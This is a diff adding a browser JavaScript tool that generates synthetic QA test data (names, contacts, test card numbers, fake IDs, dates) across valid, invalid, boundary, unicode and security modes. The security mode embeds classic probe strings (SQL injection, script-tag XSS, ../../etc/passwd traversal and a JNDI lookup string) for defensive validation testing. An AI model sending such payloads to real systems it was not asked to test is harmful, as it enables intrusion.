@@ -1,0 +1,1891 @@
+(() => {
+    "use strict";
+
+    const $ = (selector, root = document) =>
+        root.querySelector(selector);
+
+    const $$ = (selector, root = document) =>
+        Array.from(root.querySelectorAll(selector));
+
+
+    const tableBody = $("#qa-testdata-results");
+
+    if (!tableBody) {
+        return;
+    }
+
+
+    let activeGenerator = "person";
+    let currentRows = [];
+
+
+    const generatorNames = {
+        person: "Person",
+        contact: "Contact",
+        address: "Address",
+        payment: "Payment",
+        identity: "Identity",
+        internet: "Internet",
+        datetime: "Date / Time",
+        number: "Numbers",
+        text: "Text",
+        api: "API JSON",
+        edge: "Edge Cases",
+        uuid: "IDs / UUID",
+    };
+
+
+    const firstNames = {
+        india: [
+            "Arun",
+            "Meera",
+            "Karthik",
+            "Priya",
+            "Vijay",
+            "Ananya",
+            "Rahul",
+            "Divya",
+            "Naveen",
+            "Lakshmi",
+            "Sanjay",
+            "Kavya",
+        ],
+
+        usa: [
+            "James",
+            "Emma",
+            "Noah",
+            "Olivia",
+            "Ethan",
+            "Sophia",
+            "Lucas",
+            "Ava",
+        ],
+
+        uk: [
+            "Oliver",
+            "Amelia",
+            "George",
+            "Isla",
+            "Harry",
+            "Emily",
+            "Jack",
+            "Grace",
+        ],
+
+        global: [
+            "Alex",
+            "Maya",
+            "Daniel",
+            "Sara",
+            "Leo",
+            "Nina",
+            "Sam",
+            "Ari",
+        ],
+    };
+
+
+    const lastNames = {
+        india: [
+            "Kumar",
+            "Nair",
+            "Rao",
+            "Sharma",
+            "Iyer",
+            "Patel",
+            "Singh",
+            "Reddy",
+            "Menon",
+            "Das",
+        ],
+
+        usa: [
+            "Smith",
+            "Johnson",
+            "Brown",
+            "Miller",
+            "Wilson",
+            "Davis",
+        ],
+
+        uk: [
+            "Taylor",
+            "Williams",
+            "Evans",
+            "Thomas",
+            "Walker",
+            "Roberts",
+        ],
+
+        global: [
+            "Lee",
+            "Martin",
+            "Garcia",
+            "Kim",
+            "Silva",
+            "Chen",
+        ],
+    };
+
+
+    const cities = {
+        india: [
+            ["Chennai", "Tamil Nadu", "600001"],
+            ["Bengaluru", "Karnataka", "560001"],
+            ["Mumbai", "Maharashtra", "400001"],
+            ["Hyderabad", "Telangana", "500001"],
+            ["Kochi", "Kerala", "682001"],
+            ["Pune", "Maharashtra", "411001"],
+            ["Theni", "Tamil Nadu", "625531"],
+        ],
+
+        usa: [
+            ["Austin", "Texas", "78701"],
+            ["Seattle", "Washington", "98101"],
+            ["Denver", "Colorado", "80202"],
+            ["Boston", "Massachusetts", "02108"],
+        ],
+
+        uk: [
+            ["London", "England", "SW1A 1AA"],
+            ["Manchester", "England", "M1 1AE"],
+            ["Edinburgh", "Scotland", "EH1 1YZ"],
+        ],
+
+        global: [
+            ["Singapore", "Singapore", "018956"],
+            ["Toronto", "Ontario", "M5H 2N2"],
+            ["Sydney", "NSW", "2000"],
+        ],
+    };
+
+
+    function hashSeed(value) {
+        let hash = 2166136261;
+
+        for (const char of String(value || "qafox")) {
+            hash ^= char.charCodeAt(0);
+            hash = Math.imul(hash, 16777619);
+        }
+
+        return hash >>> 0;
+    }
+
+
+    function makeRng(seedText) {
+        let seed = hashSeed(seedText);
+
+        return () => {
+            seed += 0x6D2B79F5;
+
+            let t = seed;
+
+            t = Math.imul(
+                t ^ (t >>> 15),
+                t | 1
+            );
+
+            t ^= t + Math.imul(
+                t ^ (t >>> 7),
+                t | 61
+            );
+
+            return (
+                (
+                    t ^ (t >>> 14)
+                ) >>> 0
+            ) / 4294967296;
+        };
+    }
+
+
+    function pick(items, rng) {
+        return items[
+            Math.floor(rng() * items.length)
+        ];
+    }
+
+
+    function integer(min, max, rng) {
+        return Math.floor(
+            rng() * (max - min + 1)
+        ) + min;
+    }
+
+
+    function uuid(rng) {
+        const hex = "0123456789abcdef";
+
+        const part = (length) => {
+            let out = "";
+
+            for (let i = 0; i < length; i += 1) {
+                out += hex[
+                    Math.floor(rng() * 16)
+                ];
+            }
+
+            return out;
+        };
+
+        return [
+            part(8),
+            part(4),
+            "4" + part(3),
+            pick(
+                ["8", "9", "a", "b"],
+                rng
+            ) + part(3),
+            part(12),
+        ].join("-");
+    }
+
+
+    function scenarioModes() {
+        const modes = $$(
+            "[data-testdata-mode]:checked"
+        ).map(
+            (item) => item.value
+        );
+
+        return modes.length
+            ? modes
+            : ["valid"];
+    }
+
+
+    function locale() {
+        return (
+            $("#qa-testdata-locale")?.value
+            || "india"
+        );
+    }
+
+
+    function personName(rng, loc) {
+        const first = pick(
+            firstNames[loc]
+                || firstNames.global,
+            rng
+        );
+
+        const last = pick(
+            lastNames[loc]
+                || lastNames.global,
+            rng
+        );
+
+        return `${first} ${last}`;
+    }
+
+
+    function emailFor(name, index) {
+        const clean = name
+            .toLowerCase()
+            .normalize("NFKD")
+            .replace(
+                /[^a-z0-9 ]/g,
+                ""
+            )
+            .trim()
+            .replace(/\s+/g, ".");
+
+        return (
+            `${clean || "tester"}`
+            + `.${index}@example.test`
+        );
+    }
+
+
+    function mobileFor(loc, index, rng) {
+        const suffix = String(
+            integer(
+                10000000,
+                99999999,
+                rng
+            )
+        );
+
+        if (loc === "india") {
+            return (
+                "+91 9"
+                + String(
+                    index % 10
+                )
+                + suffix
+            ).slice(0, 14);
+        }
+
+        if (loc === "uk") {
+            return (
+                "+44 7700 "
+                + String(
+                    900000 + (index % 99999)
+                )
+            );
+        }
+
+        if (loc === "usa") {
+            return (
+                "+1 202-555-"
+                + String(
+                    1000 + (index % 8999)
+                )
+            );
+        }
+
+        return (
+            "+99 555 "
+            + String(
+                100000 + (index % 899999)
+            )
+        );
+    }
+
+
+    function addressFor(loc, index, rng) {
+        const pool = (
+            cities[loc]
+            || cities.global
+        );
+
+        const [city, region, postal] =
+            pick(pool, rng);
+
+        return (
+            `${integer(1, 499, rng)} `
+            + `QA Test Street, ${city}, `
+            + `${region} ${postal}`
+        );
+    }
+
+
+    function isoDate(
+        year,
+        month,
+        day
+    ) {
+        return (
+            String(year).padStart(4, "0")
+            + "-"
+            + String(month).padStart(2, "0")
+            + "-"
+            + String(day).padStart(2, "0")
+        );
+    }
+
+
+    function validDate(rng) {
+        return isoDate(
+            integer(1980, 2004, rng),
+            integer(1, 12, rng),
+            integer(1, 28, rng)
+        );
+    }
+
+
+    function scenarioForIndex(
+        index,
+        modes
+    ) {
+        return modes[
+            index % modes.length
+        ];
+    }
+
+
+    function expectedFor(mode) {
+        if (mode === "valid") {
+            return "Accept";
+        }
+
+        if (mode === "boundary") {
+            return "Validate boundary";
+        }
+
+        if (mode === "unicode") {
+            return "Accept if supported";
+        }
+
+        if (mode === "security") {
+            return "Reject / safely handle";
+        }
+
+        return "Reject";
+    }
+
+
+    const modeReasons = {
+        valid:
+            "Happy-path data should be accepted by normal validation.",
+
+        invalid:
+            "Confirms invalid or malformed input is rejected correctly.",
+
+        boundary:
+            "Tests minimum, maximum or near-limit behavior.",
+
+        security:
+            "Checks that hostile-looking text is treated only as input data.",
+
+        unicode:
+            "Checks international and multi-byte character handling.",
+    };
+
+
+    function personValue(
+        mode,
+        index,
+        rng,
+        loc
+    ) {
+        if (mode === "invalid") {
+            return "";
+        }
+
+        if (mode === "boundary") {
+            return index % 2
+                ? "A"
+                : "A".repeat(120);
+        }
+
+        if (mode === "security") {
+            return "' OR '1'='1 --";
+        }
+
+        if (mode === "unicode") {
+            return pick(
+                [
+                    "ஜெய் கதிர்வேல்",
+                    "மீனா ராஜ்",
+                    "Zoë García",
+                    "山田 太郎",
+                    "محمد علي",
+                    "QA Tester 🦊",
+                ],
+                rng
+            );
+        }
+
+        return personName(
+            rng,
+            loc
+        );
+    }
+
+
+    function contactValue(
+        mode,
+        index,
+        rng,
+        loc
+    ) {
+        const name = personName(
+            rng,
+            loc
+        );
+
+        if (mode === "invalid") {
+            return pick(
+                [
+                    "tester@",
+                    "@example.test",
+                    "not-an-email",
+                    "98765ABC",
+                    "",
+                ],
+                rng
+            );
+        }
+
+        if (mode === "boundary") {
+            return index % 2
+                ? "a@b.co"
+                : (
+                    "a".repeat(60)
+                    + "@example.test"
+                );
+        }
+
+        if (mode === "security") {
+            return (
+                "<script>"
+                + "alert(1)"
+                + "</script>@example.test"
+            );
+        }
+
+        if (mode === "unicode") {
+            return "தமிழ்.tester@example.test";
+        }
+
+        return (
+            emailFor(name, index + 1)
+            + " | "
+            + mobileFor(
+                loc,
+                index + 1,
+                rng
+            )
+        );
+    }
+
+
+    function addressValue(
+        mode,
+        index,
+        rng,
+        loc
+    ) {
+        if (mode === "invalid") {
+            return pick(
+                [
+                    "",
+                    "???",
+                    "No Postal Code",
+                    "123",
+                ],
+                rng
+            );
+        }
+
+        if (mode === "boundary") {
+            return index % 2
+                ? "1 A"
+                : (
+                    "QA Test Address "
+                    + "X".repeat(220)
+                );
+        }
+
+        if (mode === "security") {
+            return "../../etc/passwd";
+        }
+
+        if (mode === "unicode") {
+            return (
+                "12 சோதனை தெரு, "
+                + "சென்னை, தமிழ்நாடு"
+            );
+        }
+
+        return addressFor(
+            loc,
+            index,
+            rng
+        );
+    }
+
+
+    function paymentValue(
+        mode,
+        index,
+        rng
+    ) {
+        if (mode === "invalid") {
+            return pick(
+                [
+                    "Visa: 4111 1111",
+                    "Mastercard: ABCD EFGH",
+                    "Card: 0000 0000 0000 0000",
+                    "Expiry: 00/00 | CVV: 00",
+                ],
+                rng
+            );
+        }
+
+        if (mode === "boundary") {
+            return pick(
+                [
+                    "Amount: 0.00",
+                    "Amount: 0.01",
+                    "Amount: 99999999.99",
+                    "Amount: -0.01",
+                ],
+                rng
+            );
+        }
+
+        if (mode === "security") {
+            return "Amount: ' OR '1'='1";
+        }
+
+        if (mode === "unicode") {
+            return "Amount display: ₹1,234.56";
+        }
+
+        const card = (
+            index % 2 === 0
+                ? "4111 1111 1111 1111"
+                : "5555 5555 5555 4444"
+        );
+
+        return (
+            `${index % 2 === 0 ? "Visa" : "Mastercard"} `
+            + `${card} | Exp 12/30 | CVV 123 `
+            + "| SYNTHETIC TEST ONLY"
+        );
+    }
+
+
+    function identityValue(
+        mode,
+        index,
+        rng
+    ) {
+        if (mode === "invalid") {
+            return pick(
+                [
+                    "PAN-like: ABC",
+                    "Aadhaar-like: 123",
+                    "Employee ID: ",
+                ],
+                rng
+            );
+        }
+
+        if (mode === "boundary") {
+            return index % 2
+                ? "Customer-ID: 1"
+                : (
+                    "Customer-ID: "
+                    + "9".repeat(64)
+                );
+        }
+
+        if (mode === "security") {
+            return "Customer-ID: ../admin";
+        }
+
+        if (mode === "unicode") {
+            return "Customer-ID: வாடிக்கையாளர்-001";
+        }
+
+        return (
+            `UUID: ${uuid(rng)}`
+            + " | PAN-like: QAFOX"
+            + String(
+                1000 + (index % 8999)
+            )
+            + "T"
+            + " | Aadhaar-like: "
+            + "9999 0000 "
+            + String(
+                1000 + (index % 8999)
+            )
+            + " (synthetic)"
+        );
+    }
+
+
+    function internetValue(
+        mode,
+        index,
+        rng
+    ) {
+        if (mode === "invalid") {
+            return pick(
+                [
+                    "http://",
+                    "999.999.999.999",
+                    "not a url",
+                    "user@@example.test",
+                ],
+                rng
+            );
+        }
+
+        if (mode === "boundary") {
+            return (
+                "https://"
+                + "a".repeat(60)
+                + ".example.test"
+            );
+        }
+
+        if (mode === "security") {
+            return (
+                "https://example.invalid/"
+                + "?q=<script>alert(1)</script>"
+            );
+        }
+
+        if (mode === "unicode") {
+            return "https://例え.example/";
+        }
+
+        return (
+            `https://api${index + 1}.example.test/`
+            + `v1/resource/${integer(1, 999, rng)}`
+        );
+    }
+
+
+    function datetimeValue(
+        mode,
+        index,
+        rng
+    ) {
+        if (mode === "invalid") {
+            return pick(
+                [
+                    "2026-13-40",
+                    "not-a-date",
+                    "00/00/0000",
+                    "",
+                ],
+                rng
+            );
+        }
+
+        if (mode === "boundary") {
+            return index % 2
+                ? "1970-01-01T00:00:00Z"
+                : "9999-12-31T23:59:59Z";
+        }
+
+        if (mode === "security") {
+            return "2026-01-01' OR '1'='1";
+        }
+
+        if (mode === "unicode") {
+            return "17 ஆகஸ்ட் 2026";
+        }
+
+        return (
+            validDate(rng)
+            + "T"
+            + String(
+                integer(0, 23, rng)
+            ).padStart(2, "0")
+            + ":"
+            + String(
+                integer(0, 59, rng)
+            ).padStart(2, "0")
+            + ":00Z"
+        );
+    }
+
+
+    function numberValue(
+        mode,
+        index,
+        rng
+    ) {
+        if (mode === "invalid") {
+            return pick(
+                [
+                    "NaN",
+                    "Infinity",
+                    "12ABC",
+                    "",
+                    "null",
+                ],
+                rng
+            );
+        }
+
+        if (mode === "boundary") {
+            return pick(
+                [
+                    "0",
+                    "-1",
+                    "1",
+                    "2147483647",
+                    "2147483648",
+                    "-2147483648",
+                ],
+                rng
+            );
+        }
+
+        if (mode === "security") {
+            return "1 OR 1=1";
+        }
+
+        if (mode === "unicode") {
+            return "₹ १२३४.५६";
+        }
+
+        return String(
+            (
+                integer(
+                    100,
+                    999999,
+                    rng
+                ) / 100
+            ).toFixed(2)
+        );
+    }
+
+
+    function textValue(
+        mode,
+        index,
+        rng
+    ) {
+        if (mode === "invalid") {
+            return pick(
+                [
+                    "",
+                    "   ",
+                    "\\u0000",
+                    "null",
+                ],
+                rng
+            );
+        }
+
+        if (mode === "boundary") {
+            return index % 2
+                ? "A"
+                : "X".repeat(255);
+        }
+
+        if (mode === "security") {
+            return pick(
+                [
+                    "' OR '1'='1 --",
+                    "<script>alert(1)</script>",
+                    "../../etc/passwd",
+                    "${jndi:ldap://example.invalid/a}",
+                ],
+                rng
+            );
+        }
+
+        if (mode === "unicode") {
+            return pick(
+                [
+                    "தமிழ் சோதனை தரவு",
+                    "Español ñ á é í ó ú",
+                    "日本語テスト",
+                    "Emoji QA 🦊 ✅ 🚀",
+                    "العربية اختبار",
+                ],
+                rng
+            );
+        }
+
+        return (
+            "QAFox synthetic test text "
+            + String(index + 1)
+        );
+    }
+
+
+    function apiValue(
+        mode,
+        index,
+        rng,
+        loc
+    ) {
+        const name = personName(
+            rng,
+            loc
+        );
+
+        let value = {
+            customerId: uuid(rng),
+            name,
+            email: emailFor(
+                name,
+                index + 1
+            ),
+            active: true,
+            amount: Number(
+                (
+                    integer(
+                        100,
+                        500000,
+                        rng
+                    ) / 100
+                ).toFixed(2)
+            ),
+        };
+
+        if (mode === "invalid") {
+            value = {
+                customerId: 123,
+                name: null,
+                email: "invalid@",
+                active: "yes",
+                amount: "not-a-number",
+            };
+        }
+
+        if (mode === "boundary") {
+            value = {
+                customerId: uuid(rng),
+                name: "X".repeat(255),
+                email: "a@b.co",
+                active: false,
+                amount: 0,
+            };
+        }
+
+        if (mode === "security") {
+            value = {
+                customerId:
+                    "' OR '1'='1 --",
+                name:
+                    "<script>alert(1)</script>",
+                email:
+                    "tester@example.test",
+                active: true,
+                amount: 1,
+            };
+        }
+
+        if (mode === "unicode") {
+            value = {
+                customerId: uuid(rng),
+                name: "தமிழ் பயனர் 🦊",
+                email:
+                    "unicode@example.test",
+                active: true,
+                amount: 1234.56,
+            };
+        }
+
+        return JSON.stringify(
+            value,
+            null,
+            2
+        );
+    }
+
+
+    function edgeValue(
+        mode,
+        index,
+        rng
+    ) {
+        const values = {
+            valid: [
+                "normal-value",
+                "123",
+                "true",
+            ],
+
+            invalid: [
+                "",
+                "   ",
+                "null",
+                "undefined",
+                "NaN",
+            ],
+
+            boundary: [
+                "A",
+                "X".repeat(255),
+                "0",
+                "-1",
+                "2147483648",
+            ],
+
+            security: [
+                "' OR '1'='1 --",
+                "<script>alert(1)</script>",
+                "../../etc/passwd",
+                "${jndi:ldap://example.invalid/a}",
+            ],
+
+            unicode: [
+                "தமிழ்",
+                "🦊🚀✅",
+                "日本語",
+                "Español ñ",
+            ],
+        };
+
+        return pick(
+            values[mode]
+                || values.valid,
+            rng
+        );
+    }
+
+
+    function uuidValue(
+        mode,
+        index,
+        rng
+    ) {
+        if (mode === "invalid") {
+            return pick(
+                [
+                    "123",
+                    "not-a-uuid",
+                    "0000",
+                    "",
+                ],
+                rng
+            );
+        }
+
+        if (mode === "boundary") {
+            return index % 2
+                ? "0"
+                : "9".repeat(64);
+        }
+
+        if (mode === "security") {
+            return "../" + uuid(rng);
+        }
+
+        if (mode === "unicode") {
+            return "QA-அடையாளம்-" + (index + 1);
+        }
+
+        return uuid(rng);
+    }
+
+
+    function generateValue(
+        generator,
+        mode,
+        index,
+        rng,
+        loc
+    ) {
+        switch (generator) {
+            case "person":
+                return personValue(
+                    mode,
+                    index,
+                    rng,
+                    loc
+                );
+
+            case "contact":
+                return contactValue(
+                    mode,
+                    index,
+                    rng,
+                    loc
+                );
+
+            case "address":
+                return addressValue(
+                    mode,
+                    index,
+                    rng,
+                    loc
+                );
+
+            case "payment":
+                return paymentValue(
+                    mode,
+                    index,
+                    rng
+                );
+
+            case "identity":
+                return identityValue(
+                    mode,
+                    index,
+                    rng
+                );
+
+            case "internet":
+                return internetValue(
+                    mode,
+                    index,
+                    rng
+                );
+
+            case "datetime":
+                return datetimeValue(
+                    mode,
+                    index,
+                    rng
+                );
+
+            case "number":
+                return numberValue(
+                    mode,
+                    index,
+                    rng
+                );
+
+            case "text":
+                return textValue(
+                    mode,
+                    index,
+                    rng
+                );
+
+            case "api":
+                return apiValue(
+                    mode,
+                    index,
+                    rng,
+                    loc
+                );
+
+            case "edge":
+                return edgeValue(
+                    mode,
+                    index,
+                    rng
+                );
+
+            case "uuid":
+                return uuidValue(
+                    mode,
+                    index,
+                    rng
+                );
+
+            default:
+                return textValue(
+                    mode,
+                    index,
+                    rng
+                );
+        }
+    }
+
+
+    function scenarioLabel(mode) {
+        return {
+            valid: "Valid",
+            invalid: "Invalid",
+            boundary: "Boundary",
+            security: "Security",
+            unicode: "Unicode",
+        }[mode] || "Valid";
+    }
+
+
+    function buildRows() {
+        const countInput =
+            $("#qa-testdata-count");
+
+        const count = Math.max(
+            1,
+            Math.min(
+                50,
+                Number(
+                    countInput?.value || 10
+                )
+            )
+        );
+
+        if (countInput) {
+            countInput.value = String(count);
+        }
+
+        const modes = scenarioModes();
+        const loc = locale();
+
+        const seed = (
+            $("#qa-testdata-seed")?.value
+            || "qafox"
+        );
+
+        const rng = makeRng(
+            `${seed}|${activeGenerator}|${loc}`
+        );
+
+        currentRows = [];
+
+        for (
+            let index = 0;
+            index < count;
+            index += 1
+        ) {
+            const mode = scenarioForIndex(
+                index,
+                modes
+            );
+
+            currentRows.push({
+                id: index + 1,
+                scenario:
+                    scenarioLabel(mode),
+                scenarioKey: mode,
+                type:
+                    generatorNames[
+                        activeGenerator
+                    ],
+                value:
+                    generateValue(
+                        activeGenerator,
+                        mode,
+                        index,
+                        rng,
+                        loc
+                    ),
+                expected:
+                    expectedFor(mode),
+                reason:
+                    modeReasons[mode],
+            });
+        }
+
+        renderRows();
+    }
+
+
+    function escapeHtml(value) {
+        const element =
+            document.createElement("div");
+
+        element.textContent =
+            String(value ?? "");
+
+        return element.innerHTML;
+    }
+
+
+    function renderRows() {
+        tableBody.innerHTML =
+            currentRows.map(
+                (row) => `
+                <tr>
+                    <td>
+                        ${row.id}
+                    </td>
+
+                    <td>
+                        <span class="qa-data-scenario ${row.scenarioKey}">
+                            ${escapeHtml(row.scenario)}
+                        </span>
+                    </td>
+
+                    <td>
+                        <span class="qa-data-type">
+                            ${escapeHtml(row.type)}
+                        </span>
+                    </td>
+
+                    <td class="qa-data-value-cell">
+                        <code>${escapeHtml(row.value)}</code>
+                    </td>
+
+                    <td>
+                        <span class="qa-data-expected">
+                            ${escapeHtml(row.expected)}
+                        </span>
+                    </td>
+
+                    <td class="qa-data-reason">
+                        ${escapeHtml(row.reason)}
+                    </td>
+
+                    <td>
+                        <button
+                            type="button"
+                            class="qa-data-copy"
+                            data-copy-row="${row.id - 1}"
+                            title="Copy generated value">
+                            ⧉
+                        </button>
+                    </td>
+                </tr>
+                `
+            ).join("");
+
+        const title =
+            $("#qa-testdata-result-title");
+
+        if (title) {
+            title.textContent =
+                `${
+                    generatorNames[
+                        activeGenerator
+                    ]
+                } Test Data`;
+        }
+
+        const summary =
+            $("#qa-testdata-result-summary");
+
+        if (summary) {
+            summary.textContent =
+                `${currentRows.length} synthetic scenarios generated across ${
+                    scenarioModes()
+                        .map(scenarioLabel)
+                        .join(", ")
+                } modes.`;
+        }
+
+        const count =
+            $("#qa-testdata-row-count");
+
+        if (count) {
+            count.textContent =
+                `${currentRows.length} ${
+                    currentRows.length === 1
+                        ? "row"
+                        : "rows"
+                }`;
+        }
+
+        const insight =
+            $("#qa-testdata-insight");
+
+        if (insight) {
+            insight.textContent =
+                buildInsight();
+        }
+    }
+
+
+    function buildInsight() {
+        const modes = scenarioModes();
+
+        const insights = [];
+
+        if (modes.includes("invalid")) {
+            insights.push(
+                "invalid-format validation"
+            );
+        }
+
+        if (modes.includes("boundary")) {
+            insights.push(
+                "boundary handling"
+            );
+        }
+
+        if (modes.includes("security")) {
+            insights.push(
+                "safe handling of hostile-looking input"
+            );
+        }
+
+        if (modes.includes("unicode")) {
+            insights.push(
+                "international character support"
+            );
+        }
+
+        if (!insights.length) {
+            insights.push(
+                "happy-path validation"
+            );
+        }
+
+        return (
+            "This dataset exercises "
+            + insights.join(", ")
+            + "."
+        );
+    }
+
+
+    function promptGenerator(prompt) {
+        const text =
+            String(prompt || "")
+                .toLowerCase();
+
+        const mappings = [
+            [
+                [
+                    "visa",
+                    "mastercard",
+                    "card",
+                    "payment",
+                    "credit card",
+                    "cvv",
+                ],
+                "payment",
+            ],
+
+            [
+                [
+                    "email",
+                    "phone",
+                    "mobile",
+                    "contact",
+                ],
+                "contact",
+            ],
+
+            [
+                [
+                    "address",
+                    "postal",
+                    "zipcode",
+                    "zip code",
+                    "pincode",
+                    "pin code",
+                ],
+                "address",
+            ],
+
+            [
+                [
+                    "aadhaar",
+                    "pan",
+                    "passport",
+                    "identity",
+                    "customer id",
+                    "employee id",
+                ],
+                "identity",
+            ],
+
+            [
+                [
+                    "json",
+                    "api",
+                    "request body",
+                    "payload",
+                ],
+                "api",
+            ],
+
+            [
+                [
+                    "date",
+                    "dob",
+                    "timestamp",
+                    "time",
+                ],
+                "datetime",
+            ],
+
+            [
+                [
+                    "number",
+                    "amount",
+                    "decimal",
+                    "integer",
+                ],
+                "number",
+            ],
+
+            [
+                [
+                    "url",
+                    "domain",
+                    "ip",
+                    "internet",
+                ],
+                "internet",
+            ],
+
+            [
+                [
+                    "uuid",
+                    "identifier",
+                    "id",
+                ],
+                "uuid",
+            ],
+
+            [
+                [
+                    "security",
+                    "negative",
+                    "edge",
+                    "boundary",
+                ],
+                "edge",
+            ],
+
+            [
+                [
+                    "name",
+                    "person",
+                    "customer",
+                    "user",
+                ],
+                "person",
+            ],
+        ];
+
+        for (
+            const [
+                keywords,
+                generator
+            ] of mappings
+        ) {
+            if (
+                keywords.some(
+                    (keyword) =>
+                        text.includes(keyword)
+                )
+            ) {
+                return generator;
+            }
+        }
+
+        return "person";
+    }
+
+
+    function activateGenerator(
+        generator
+    ) {
+        activeGenerator = generator;
+
+        $$(".qa-generator-tile")
+            .forEach((button) => {
+                button.classList.toggle(
+                    "is-active",
+                    button.dataset.generator
+                        === generator
+                );
+            });
+    }
+
+
+    async function copyText(value) {
+        try {
+            await navigator.clipboard
+                .writeText(value);
+
+            toast("Copied to clipboard");
+        } catch (_) {
+            const textarea =
+                document.createElement(
+                    "textarea"
+                );
+
+            textarea.value = value;
+
+            document.body.appendChild(
+                textarea
+            );
+
+            textarea.select();
+
+            document.execCommand("copy");
+
+            textarea.remove();
+
+            toast("Copied to clipboard");
+        }
+    }
+
+
+    function toast(message) {
+        let node =
+            $("#qa-testdata-toast");
+
+        if (!node) {
+            node =
+                document.createElement(
+                    "div"
+                );
+
+            node.id =
+                "qa-testdata-toast";
+
+            node.className =
+                "qa-testdata-toast";
+
+            document.body.appendChild(
+                node
+            );
+        }
+
+        node.textContent = message;
+
+        node.classList.add(
+            "is-visible"
+        );
+
+        window.clearTimeout(
+            node._timer
+        );
+
+        node._timer =
+            window.setTimeout(
+                () => {
+                    node.classList.remove(
+                        "is-visible"
+                    );
+                },
+                1800
+            );
+    }
+
+
+    function csvEscape(value) {
+        const text =
+            String(value ?? "");
+
+        if (
+            /[",\n\r]/.test(text)
+        ) {
+            return (
+                '"'
+                + text.replace(
+                    /"/g,
+                    '""'
+                )
+                + '"'
+            );
+        }
+
+        return text;
+    }
+
+
+    function asCsv() {
+        const headers = [
+            "scenario",
+            "type",
+            "value",
+            "expected",
+            "reason",
+        ];
+
+        const lines = [
+            headers.join(","),
+        ];
+
+        for (const row of currentRows) {
+            lines.push(
+                [
+                    row.scenario,
+                    row.type,
+                    row.value,
+                    row.expected,
+                    row.reason,
+                ]
+                    .map(csvEscape)
+                    .join(",")
+            );
+        }
+
+        return lines.join("\n");
+    }
+
+
+    function download(
+        filename,
+        content,
+        mime
+    ) {
+        const blob = new Blob(
+            [content],
+            {
+                type: mime,
+            }
+        );
+
+        const url =
+            URL.createObjectURL(blob);
+
+        const anchor =
+            document.createElement("a");
+
+        anchor.href = url;
+        anchor.download = filename;
+
+        document.body.appendChild(
+            anchor
+        );
+
+        anchor.click();
+        anchor.remove();
+
+        URL.revokeObjectURL(url);
+    }
+
+
+    $$(".qa-generator-tile")
+        .forEach((button) => {
+            button.addEventListener(
+                "click",
+                () => {
+                    activateGenerator(
+                        button.dataset.generator
+                    );
+                }
+            );
+        });
+
+
+    $("#qa-testdata-generate")
+        ?.addEventListener(
+            "click",
+            buildRows
+        );
+
+
+    $("#qa-testdata-smart-generate")
+        ?.addEventListener(
+            "click",
+            () => {
+                const prompt =
+                    $("#qa-testdata-prompt")
+                        ?.value
+                    || "";
+
+                const detected =
+                    promptGenerator(prompt);
+
+                activateGenerator(
+                    detected
+                );
+
+                const lower =
+                    prompt.toLowerCase();
+
+                if (
+                    lower.includes(
+                        "security"
+                    )
+                ) {
+                    const checkbox =
+                        $(
+                            '[data-testdata-mode="security"]'
+                        );
+
+                    if (checkbox) {
+                        checkbox.checked = true;
+                    }
+                }
+
+                if (
+                    lower.includes(
+                        "unicode"
+                    )
+                    || lower.includes(
+                        "international"
+                    )
+                    || lower.includes(
+                        "tamil"
+                    )
+                ) {
+                    const checkbox =
+                        $(
+                            '[data-testdata-mode="unicode"]'
+                        );
+
+                    if (checkbox) {
+                        checkbox.checked = true;
+                    }
+                }
+
+                buildRows();
+
+                toast(
+                    `Detected ${
+                        generatorNames[detected]
+                    } test data`
+                );
+            }
+        );
+
+
+    tableBody.addEventListener(
+        "click",
+        (event) => {
+            const button =
+                event.target.closest(
+                    "[data-copy-row]"
+                );
+
+            if (!button) {
+                return;
+            }
+
+            const index =
+                Number(
+                    button.dataset.copyRow
+                );
+
+            const row =
+                currentRows[index];
+
+            if (row) {
+                copyText(row.value);
+            }
+        }
+    );
+
+
+    $("#qa-testdata-copy-all")
+        ?.addEventListener(
+            "click",
+            () => {
+                if (!currentRows.length) {
+                    toast(
+                        "Generate data first"
+                    );
+
+                    return;
+                }
+
+                copyText(
+                    currentRows
+                        .map(
+                            (row) =>
+                                row.value
+                        )
+                        .join("\n")
+                );
+            }
+        );
+
+
+    $("#qa-testdata-export-json")
+        ?.addEventListener(
+            "click",
+            () => {
+                if (!currentRows.length) {
+                    toast(
+                        "Generate data first"
+                    );
+
+                    return;
+                }
+
+                download(
+                    "qafox-testdata.json",
+                    JSON.stringify(
+                        {
+                            generator:
+                                activeGenerator,
+                            locale:
+                                locale(),
+                            generatedAt:
+                                new Date()
+                                    .toISOString(),
+                            synthetic:
+                                true,
+                            rows:
+                                currentRows,
+                        },
+                        null,
+                        2
+                    ),
+                    "application/json"
+                );
+            }
+        );
+
+
+    $("#qa-testdata-export-csv")
+        ?.addEventListener(
+            "click",
+            () => {
+                if (!currentRows.length) {
+                    toast(
+                        "Generate data first"
+                    );
+
+                    return;
+                }
+
+                download(
+                    "qafox-testdata.csv",
+                    asCsv(),
+                    "text/csv;charset=utf-8"
+                );
+            }
+        );
+
+
+    buildRows();
+})();
